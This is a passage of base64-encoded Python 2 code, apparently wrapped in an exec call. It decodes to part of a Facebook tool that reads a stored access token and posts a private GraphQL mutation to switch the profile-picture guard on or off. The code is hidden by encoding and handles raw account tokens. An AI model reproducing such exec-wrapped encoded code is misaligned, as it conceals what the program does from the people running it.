vIENvbm5lY3Rpb24iCiAgICBrZWx1YXIoKQogIGV4Y2VwdCBJT0Vycm9yOgogICAgcHJpbnQgIlwwMzNbMTs5MW1bIV0gRXJyb3IiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgICAKIyMjIyMgUFJPRklMIEdVQVJEICMjIyMjCmRlZiBndWFyZCgpOgogIGdsb2JhbCB0b2tldAogIG9zLnN5c3RlbSgncmVzZXQnKQogIHRyeToKICAgIHRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKICBleGNlcHQgSU9FcnJvcjoKICAgIHByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgogICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgIHRpbWUuc2xlZXAoMSkKICAgIGxvZ2luKCkKICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICBwcmludCBsb2dvCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gQWN0aXZhdGUiCiAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gTm90IGFjdGl2YXRlIgogIHByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siCiAgcHJpbnQgIuKVkSIKICBnID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCiAgaWYgZyA9PSAiMSI6CiAgICBha3RpZiA9ICJ0cnVlIgogICAgZ2F6KHRva2V0LCBha3RpZikKICBlbGlmIGcgPT0gIjIiOgogICAgbm9uID0gImZhbHNlIgogICAgZ2F6KHRva2V0LCBub24pCiAgZWxpZiBnID09IjAiOgogICAgbGFpbigpCiAgZWxpZiBnID09IiI6CiAgICBrZWx1YXIoKQogIGVsc2U6CiAgICBrZWx1YXIoKQogIApkZWYgZ2V0X3VzZXJpZCh0b2tldCk6CiAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0lcyIldG9rZXQKICByZXMgPSByZXF1ZXN0cy5nZXQodXJsKQogIHVpZCA9IGpzb24ubG9hZHMocmVzLnRleHQpCiAgcmV0dXJuIHVpZFsiaWQiXQogICAgCmRlZiBnYXoodG9rZXQsIGVuYWJsZSA9IFRydWUpOgogIGlkID0gZ2V0X3VzZXJpZCh0b2tldCkKICBkYXRhID0gJ3ZhcmlhYmxlcz17IjAiOnsiaXNfc2hpZWxkZWQiOiAlcywic2Vzc2lvbl9pZCI6IjliNzgxOTFjLTg0ZmQtNGFiNi1iMGFhLTE5YjM5ZjA0YTZiYyIsImFjdG9yX2lkIjoiJXMiLCJjbGllbnRfbXV0YXRpb25faWQiOiJiMDMxNmRkNi0zZmQ2LTRiZWItYWVkNC1iYjI5YzVkYzY0YjAifX0mbWV0aG9kPXBvc3QmZG9jX2lkPTE0NzcwNDMyOTIzNjcxODMmcXVlcnlfbmFtZT1Jc1NoaWVsZGVkU2V0TXV0YXRpb24mc3RyaXBfZGVmYXVsdHM9dHJ1ZSZzdHJpcF9udWxscz10cnVlJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1Jc1NoaWVsZGVkU2V0TXV0YXRpb24mZmJfYXBpX2NhbGxlcl9jbGFzcz1Jc1NoaWVsZGVkU2V0TXV0YXRpb24nICUgKGVuYWJsZSwgc3RyKGlkKSkKICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiIDogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsICJBdXRob3JpemF0aW9uIiA6ICJPQXV0aCAlcyIgJSB0b2tldH0KICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JhcGhxbCIKICByZXMgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YSA9IGRhdGEsIGhlYWRlcnMgPSBoZWFkZXJzKQogIHByaW50KHJlcy50ZXh0KQogIGlmICciaXNfc2hpZWxkZWQiOnRydWUnIGluIHJlcy50ZXh0OgogICAgb3Muc3lzdGVtKCdyZXNldCcpCiAgICBwcmludCBsb2dvCiAgICBwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQWN0aXZhdGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgZWxpZiAnImlzX3NoaWVsZGVkIjpmYWxzZScgaW4gcmVzLnRleHQ6CiAgICBvcy5zeXN0ZW0oJ3Jlc2V0JykKICAgIHByaW50IGxvZ28KICAgIHByaW50IlwwMzNbMTs5MW1bXDAzM1sxOzk2beKck1wwMzNbMTs5MW1dIFwwMzNbMTs5MW1Ob3QgYWN0aXZhdGUiCiAgICByYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQogICAgbGFpbigpCiAgZWxzZToKICAgIHByaW50ICJcMDMzWzE7OTFtWyFdIEVycm9yIgogICAga2VsdWFyKCkKICAKbGlzZW5zaSgp"))